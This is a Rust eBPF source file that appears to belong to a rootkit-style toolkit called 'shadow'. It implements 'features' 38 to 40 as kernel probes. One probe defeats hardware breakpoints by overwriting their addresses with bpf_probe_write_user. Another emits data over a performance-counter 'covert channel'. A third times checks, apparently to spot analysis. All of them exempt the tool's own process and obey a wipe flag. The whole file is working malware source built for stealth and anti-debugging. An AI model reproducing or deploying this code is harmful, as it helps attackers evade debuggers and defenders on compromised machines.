use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_write_user},
    macros::{kprobe, kretprobe},
    programs::{ProbeContext, RetProbeContext},
};
use common::{EventHeader, EVENT_DR_BREAKPOINT, EVENT_PMC_COVERT, EVENT_TSC_SIDECHAN};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 38: Hardware Breakpoint (DR Register) Abuse
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_hw_breakpoint_install(ctx: ProbeContext) -> u32 {
    try_hw_breakpoint_install(&ctx).unwrap_or_default()
}

fn try_hw_breakpoint_install(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let bp_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let bp_addr: u64 =
        unsafe { aya_ebpf::helpers::bpf_probe_read_kernel((bp_ptr + 16) as *const u64)? };

    let mut is_our_addr = false;
    for i in 0..4u32 {
        if let Some(watched) = unsafe { DR_WATCH_ADDRS.get(i) } {
            if *watched == bp_addr {
                is_our_addr = true;
                break;
            }
        }
    }

    if is_our_addr {
        let zero_addr: u64 = 0;
        unsafe {
            let _ = bpf_probe_write_user(
                (bp_ptr + 16) as *mut u64,
                &zero_addr as *const u64,
            );
        }

        let event = EventHeader {
            event_type: EVENT_DR_BREAKPOINT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: bp_addr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 39: CPU Performance Counter Covert Channel
// ──────────────────────────────────────────────

#[kretprobe]
pub fn shadow_perf_event_read_ret(ctx: RetProbeContext) -> u32 {
    try_perf_event_read_ret(&ctx).unwrap_or_default()
}

fn try_perf_event_read_ret(ctx: &RetProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    if let Some(&covert_val) = unsafe { PMC_COVERT_DATA.get(&pid) } {
        let event = EventHeader {
            event_type: EVENT_PMC_COVERT,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: covert_val,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 40: TSC Timing Side Channel
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_tsc_check_enter(ctx: ProbeContext) -> u32 {
    try_tsc_check_enter(&ctx).unwrap_or_default()
}

fn try_tsc_check_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let now = unsafe { bpf_ktime_get_ns() };

    if let Some(slot) = unsafe { TSC_BASELINE.get_ptr_mut(0) } {
        unsafe { *slot = now };
    }

    Ok(0)
}

#[kretprobe]
pub fn shadow_tsc_check_exit(ctx: RetProbeContext) -> u32 {
    try_tsc_check_exit(&ctx).unwrap_or_default()
}

fn try_tsc_check_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let baseline = match unsafe { TSC_BASELINE.get(0) } {
        Some(&v) => v,
        None => return Ok(0),
    };

    if baseline == 0 {
        return Ok(0);
    }

    let now = unsafe { bpf_ktime_get_ns() };
    let delta = now.saturating_sub(baseline);

    const ANOMALY_THRESHOLD_NS: u64 = 100_000_000;

    if delta > ANOMALY_THRESHOLD_NS {
        let event = EventHeader {
            event_type: EVENT_TSC_SIDECHAN,
            pid,
            timestamp_ns: now,
            context: delta,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}
